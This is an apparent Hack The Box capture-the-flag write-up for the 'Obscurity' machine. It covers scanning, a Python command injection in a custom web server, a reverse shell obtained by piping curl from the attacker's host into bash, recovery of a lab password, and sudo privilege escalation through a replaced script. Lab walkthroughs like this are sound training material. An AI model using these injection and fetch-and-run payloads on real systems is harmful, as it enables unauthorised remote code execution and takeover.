# [Obscurity](https://app.hackthebox.com/machines/Obscurity)

```bash
nmap -p- --min-rate 10000 10.10.10.168 -Pn 
```

![alt text](img/image.png)


Let's do greater scan for these open ports.

```bash
nmap -A -sC -sV -p22,80,8080 10.10.10.168 -Pn
```

![alt text](img/image-1.png)


Let's do `directory enumeration`.

```bash
gobuster dir -u http://10.10.10.168/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 40
```

![alt text](img/image-2.png)

We cannot do `directory enumeration`, we have a lot of errors.


There's I see some message that `SuperSecureServer.py` is running for this target application.

![alt text](img/image-3.png)


Let's try to find this file's exact location via `wfuzz`.
```bash
wfuzz -c -w dev_dirs -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py --hl 6 --hw 367
```

![alt text](img/image-4.png)


Now, I currently know exact location of this file that `/develop/SuperSecureServer.py`

![alt text](img/image-5.png)


On `Request` class, there's method called `parseRequest` which , there's command injection is possible.
```bash
/';os.system('ping%20-c%201%2010.10.14.7');'
```

![alt text](img/image-6.png)

Let's enter this input and see result via `tcpdump` for `tun0` interface.

![alt text](img/image-7.png)


Now, it's time for reverse shell.


1.First, I create my malicious `bash` script.

![alt text](img/image-8.png)

2.Then, I open http server to serve this file
```bash
python3 -m http.server --bind 10.10.14.7 8080
```

![alt text](img/image-10.png)


3.Let's enter below input to get command injection.
```bash
/';os.system('curl%2010.10.14.7:8080/dr4ks.sh|bash');'
```

![alt text](img/image-9.png)


Hola, I got reverse shell from port `1337`.

![alt text](img/image-11.png)


Let's make interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

![alt text](img/image-12.png)


I find `SuperSecureCrypt.py` file on `robert's` desktop, let's abuse this.

```bash
python3 SuperSecureCrypt.py -i out.txt -k "Encrypting this file with your key should result in out.txt, make sure your key is correct!" -d -o /dev/shm/key.txt
```

![alt text](img/image-13.png)


![alt text](img/image-14.png)


I got password of `robert` user.


robert: SecThruObsFTW


user.txt

![alt text](img/image-15.png)


For privilege escalation, I just run `sudo -l` on terminal.

![alt text](img/image-17.png)

Now, I will try to change name of directory called `BetterSSH` to another name via `mv` command, then create `BetterSSH` script which has malicious `python` script inside of this.

```bash
echo -e '#!/usr/bin/env python3\n\nimport pty\n\npty.spawn("bash")' > BetterSSH.py 
```

![alt text](img/image-16.png)


root.txt

![alt text](img/image-18.png)